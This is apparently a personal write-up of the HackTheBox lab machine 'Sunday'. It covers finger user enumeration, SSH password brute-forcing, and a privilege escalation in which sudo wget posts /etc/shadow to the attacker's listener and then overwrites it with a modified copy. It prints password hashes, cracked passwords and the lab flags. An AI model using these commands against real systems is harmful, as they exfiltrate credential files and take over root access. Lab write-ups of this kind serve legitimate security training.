Sunday IP:10.10.10.76


rustscan:

PORT      STATE SERVICE   REASON
79/tcp    open  finger    syn-ack
111/tcp   open  rpcbind   syn-ack
515/tcp   open  printer   syn-ack
6787/tcp  open  smc-admin syn-ack
22022/tcp open  unknown   syn-ack



nmap:


PORT      STATE SERVICE  REASON  VERSION
79/tcp    open  finger?  syn-ack
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
515/tcp   open  printer  syn-ack
6787/tcp  open  ssl/http syn-ack Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14
| http-title: Solaris Dashboard
|_Requested resource was https://10.10.10.76:6787/solaris/
| ssl-cert: Subject: commonName=sunday
| Subject Alternative Name: DNS:sunday
| Issuer: commonName=sunday/organizationName=Host Root CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-12-08T19:40:00
| Not valid after:  2031-12-06T19:40:00
| MD5:   6bd3 4b32 c05a e5fe a8c8 61f0 4361 414a
| SHA-1: a5eb c880 968c 84aa 10b2 a944 bad2 56ca aed5 b66a
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcqgAwIBAgIHAIqqcz45jjALBgkqhkiG9w0BAQswKDEVMBMGA1UEChMM
| SG9zdCBSb290IENBMQ8wDQYDVQQDEwZzdW5kYXkwHhcNMjExMjA4MTk0MDAwWhcN
| MzExMjA2MTk0MDAwWjARMQ8wDQYDVQQDEwZzdW5kYXkwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQC67wVPVDRPU/Sahp2QnHx2NlMUQrkyBJrr4TSjS9v6
| /DFKqf3m2XnYuKyFl9BAO8Mi+Hz3ON4nZWmigZGX6LnJpci6whB89pLZdcogruB8
| YMyGuP8y2v3orEBLQ5NrcP6fcKLMp+6PXurvuZDgPH+oXHJyp/w//pkBROQRC0oN
| 8dx7Zq2t4ZfDiqhgw1j79V7kZNOjKp8gU1HmQ/BjYEaOfVZNwuTVyqUtfcjuxIio
| JEHaVmhNV9Xp9DAOLBFuTXpsJe3anSjGGP0DWMyNOps2VrZUyJwC22U5jlcp7Rj/
| WWE5gnm6ClH44DXlKMIt8O2vq0MfqvvGeSIFbSOPb6Q3AgMBAAGjKjAoMBEGA1Ud
| EQQKMAiCBnN1bmRheTATBgNVHSUEDDAKBggrBgEFBQcDATALBgkqhkiG9w0BAQsD
| ggEBAC/f3nN6ur2oSSedYNIkf6/+MV3qu8xE+Cqt/SbSk0uSmQ7hYpMhc8Ele/gr
| Od0cweaClKXEhugRwfVW5jmjJXrnSZtOpyz09dMhZMA9RJ9efVfnrn5Qw5gUriMx
| dFMrAnOIXsFu0vnRZLJP7E95NHpZVECnRXCSPjp4iPe/vyl1OuoVLBhoOwZ8O7zw
| WlP/51SiII8LPNyeq+01mCY0mv3RJD9uAeNJawnFwsCo/Tg9/mjk0zxUMaXm80Bb
| qsSmST23vYwuPw3c/91fJI4dWb7uEZJa55hRIU0uMPOLOUpN1kKkGPO+7QCzfedc
| WPptRhU+2UMGhFXHyGV5EJp2zvc=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
22022/tcp open  ssh      syn-ack OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsG4q9TS6eAOrX6zI+R0CMMkCTfS36QDqQW5NcF/v9vmNWyL6xSZ8x38AB2T+Kbx672RqYCtKmHcZMFs55Q3hoWQE7YgWOJhXw9agE3aIjXiWCNhmmq4T5+zjbJWbF4OLkHzNzZ2qGHbhQD9Kbw9AmyW8ZS+P8AGC5fO36AVvgyS8+5YbA05N3UDKBbQu/WlpgyLfuNpAq9279mfq/MUWWRNKGKICF/jRB3lr2BMD+BhDjTooM7ySxpq7K9dfOgdmgqFrjdE4bkxBrPsWLF41YQy3hV0L/MJQE2h+s7kONmmZJMl4lAZ8PNUqQe6sdkDhL1Ex2+yQlvbyqQZw3xhuJ
|   256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII/0DH8qZiCfAzZNkSaAmT39TyBUFFwjdk8vm7ze+Wwm
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.91%I=7%D=2/2%Time=63DBCD82%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\x20\
SF:x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20
SF:\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?
SF:\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?
SF:\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHELP\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r
SF:\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20\x20\
SF:x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20
SF:When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.0\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(SSL
SF:SessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\x20\x
SF:20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20T
SF:TY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\
SF:x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");


so on port 6787 we have Solaris Dashboard


We will try to see what is going on with finger relic software

for this we can use finger to check for logged in users

                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Practice/HackTheBox/Sunday]
└─$ finger 10.10.10.76                            
finger: 10.10.10.76: no such user.


No luck. no one is logged in :(

Using finger-user-enum.pl script we can provide a list of common usernames and try to check if any exists on the machine

./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76                                                                                                        1 ⨯
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Thu Feb  2 10:06:28 2023 #########
access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..netadm   Network Admin                      < .  .  .  . >..netcfg   Network Configuratio               < .  .  .  . >..dhcpserv DHCP Configuration A               < .  .  .  . >..ikeuser  IKE Admin                          < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..
anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@10.10.10.76: bin             ???                         < .  .  .  . >..
dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
ike@10.10.10.76: ikeuser  IKE Admin                          < .  .  .  . >..
jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..ann                   ???..jo                    ???..
la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..mela                  ???..miof                  ???..
root@10.10.10.76: root     Super-User            console      <Oct 14 10:28>..
sammy@10.10.10.76: sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sunny@10.10.10.76: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sys@10.10.10.76: sys             ???                         < .  .  .  . >..



From all the clutter it seems that there are 2 users: sammy and sunny 

I've found out the password of sunny user, after brute forcing it with msfconsole -> msf6 auxiliary(scanner/ssh/ssh_login) > 

password is sunday

passwd for sammy is cooldude

now we can log on as sunny user :
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ ssh sunny@10.10.10.76 -p 22022 
The authenticity of host '[10.10.10.76]:22022 ([10.10.10.76]:22022)' can't be established.
ED25519 key fingerprint is SHA256:t3OPHhtGi4xT7FTt3pgi5hSIsfljwBsZAUOPVy8QyXc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.10.76]:22022' (ED25519) to the list of known hosts.
Password: 
Warning: at least 15 failed authentication attempts since last successful authentication.  The latest at Thu Feb 02 15:21 2023.
Last login: Wed Apr 13 15:35:50 2022 from 10.10.14.13
Oracle Corporation      SunOS 5.11      11.4    Aug 2018
sunny@sunday:~$ 


USER FLAG:
sunny@sunday:/home/sammy$ cat user.txt 
60c1b9f16082c3517b617805f2732548
sunny@sunday:/home/sammy$ 


we found something interesting

sunny@sunday:/$ ls
backup    boot      dev       etc       home      lib       mnt       nfs4      platform  root      sbin      tmp       var
bin       cdrom     devices   export    kernel    media     net       opt       proc      rpool     system    usr       zvboot
sunny@sunday:/$ cd backup
sunny@sunday:/backup$ ls -l
total 4
-rw-r--r--   1 root     root         319 Dec 19  2021 agent22.backup
-rw-r--r--   1 root     root         319 Dec 19  2021 shadow.backup
sunny@sunday:/backup$ cat shadow.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
sunny@sunday:/backup$ 



sammy@sunday:/backup$ sudo -l
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

    we will try to get root by changing the pass of root to one we already know:





    sudo nc -lvnp 80                  
[sudo] password for kali: 
listening on [any] 80 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.76] 50667
POST / HTTP/1.1
User-Agent: Wget/1.19.5 (solaris2.11)
Accept: */*
Accept-Encoding: identity
Host: 10.10.14.14
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 962

root:x:0:0:Super-User:/root:/usr/bin/bash
daemon:x:1:1::/:/bin/sh
bin:x:2:2::/:/bin/sh
sys:x:3:3::/:/bin/sh
adm:x:4:4:Admin:/var/adm:/bin/sh
dladm:x:15:65:Datalink Admin:/:
netadm:x:16:65:Network Admin:/:
netcfg:x:17:65:Network Configuration Admin:/:
dhcpserv:x:18:65:DHCP Configuration Admin:/:
ftp:x:21:21:FTPD Reserved UID:/:
sshd:x:22:22:sshd privsep:/var/empty:/bin/false
smmsp:x:25:25:SendMail Message Submission Program:/:
aiuser:x:61:61:AI User:/:
ikeuser:x:67:12:IKE Admin:/:
lp:x:71:8:Line Printer Admin:/:/bin/sh
openldap:x:75:75:OpenLDAP User:/:/usr/bin/pfbash
webservd:x:80:80:WebServer Reserved UID:/:/bin/sh
unknown:x:96:96:Unknown Remote UID:/:/bin/sh
pkg5srv:x:97:97:pkg(7) server UID:/:
nobody:x:60001:60001:NFS Anonymous Access User:/:/bin/sh
noaccess:x:60002:65534:No Access User:/:/bin/sh
nobody4:x:65534:65534:SunOS 4.x NFS Anonymous Access User:/:/bin/sh
sammy:x:100:10::/home/sammy:/usr/bin/bash
sunny:x:101:10::/home/sunny:/usr/bin/bash



sammy@sunday:/backup$ sudo /usr/bin/wget --post-file=/etc/shadow 10.10.14.14
--2023-02-02 15:42:45--  http://10.10.14.14/
Connecting to 10.10.14.14:80... connected.
HTTP request sent, awaiting response... 



sudo nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.76] 51809
POST / HTTP/1.1
User-Agent: Wget/1.19.5 (solaris2.11)
Accept: */*
Accept-Encoding: identity
Host: 10.10.14.14
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 747

root:$5$rounds=10000$fIoXFZ5A$k7PlwsiH0wAyVOcKaAYl/Mo1Iq6XYfJlFXs58aA4Sr3:18969::::::9714228
daemon:NP:6445::::::
bin:NP:6445::::::
sys:NP:6445::::::
adm:NP:6445::::::
dladm:*LK*:17760::::::
netadm:*LK*:17760::::::
netcfg:*LK*:17760::::::
dhcpserv:*LK*:17760::::::
ftp:*LK*:17760::::::
sshd:*LK*:17760::::::
smmsp:NP:17760::::::
aiuser:*LK*:17760::::::
ikeuser:*LK*:17760::::::
lp:NP:6445::::::
openldap:NP:17760::::::
webservd:*LK*:17760::::::
unknown:*LK*:17760::::::
pkg5srv:NP:17760::::::
nobody:*LK*:17760::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$rounds=10000$lUpW4prM$aKFJxjI7vlcj5DDvwIgYGy707a84mIEi0ZQK3XIDqT2:18980::::::
sunny:$5$rounds=10000$bioFdRBN$1TTdfQFfhjNicxWhH07f8BIHABZ8di01CXWYTT5rMn9:18980::::::9461168




now we replace the hash of root with the hash of sunny and we save the file as shadow

Next step is to overwrite the /etc/shadow with the modified file on the victim machine. Host the file on attacking machine and download it
sammy@sunday:/backup$ sudo wget 10.10.14.14/shadow -O /etc/shadow
--2023-02-02 15:47:23--  http://10.10.14.14/shadow
Connecting to 10.10.14.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 746 [application/octet-stream]
Saving to: ‘/etc/shadow’

/etc/shadow                                       100%[==========================================================================================================>]     746  --.-KB/s    in 0s      

2023-02-02 15:47:23 (16.2 MB/s) - ‘/etc/shadow’ saved [746/746]


read the file in order to make sure that the correct changes have been applied:

sammy@sunday:/backup$ sudo /usr/bin/wget --post-file=/etc/shadow 10.10.14.14
--2023-02-02 15:47:42--  http://10.10.14.14/
Connecting to 10.10.14.14:80... connected.
HTTP request sent, awaiting response... No data received.
Retrying.

--2023-02-02 15:47:56--  (try: 2)  http://10.10.14.14/


sudo nc -lvnp 80              
listening on [any] 80 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.76] 55101
POST / HTTP/1.1
User-Agent: Wget/1.19.5 (solaris2.11)
Accept: */*
Accept-Encoding: identity
Host: 10.10.14.14
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 746

root:$5$rounds=10000$bioFdRBN$1TTdfQFfhjNicxWhH07f8BIHABZ8di01CXWYTT5rMn9:18969::::::9714228
daemon:NP:6445::::::
bin:NP:6445::::::
sys:NP:6445::::::
adm:NP:6445::::::
dladm:*LK*:17760::::::
netadm:*LK*:17760::::::
netcfg:*LK*:17760::::::
dhcpserv:*LK*:17760::::::
ftp:*LK*:17760::::::
sshd:*LK*:17760::::::
smmsp:NP:17760::::::
aiuser:*LK*:17760::::::
ikeuser:*LK*:17760::::::
lp:NP:6445::::::
openldap:NP:17760::::::
webservd:*LK*:17760::::::
unknown:*LK*:17760::::::
pkg5srv:NP:17760::::::
nobody:*LK*:17760::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$rounds=10000$lUpW4prM$aKFJxjI7vlcj5DDvwIgYGy707a84mIEi0ZQK3XIDqT2:18980::::::
sunny:$5$rounds=10000$bioFdRBN$1TTdfQFfhjNicxWhH07f8BIHABZ8di01CXWYTT5rMn9:18980::::::9461168

great, changes are there. Now let's switch to root user and use the password from sunny user: sunday

sammy@sunday:/backup$ su
Password: 
Warning: 4 failed authentication attempts since last successful authentication.  The latest at Thu Feb 02 14:59 2023.
root@sunday:/backup#

Great we are root!!!!



root@sunday:/root# cat root.txt
1d410fef4a78c6cd0076ce8eff57ff1f
root@sunday:/root# 
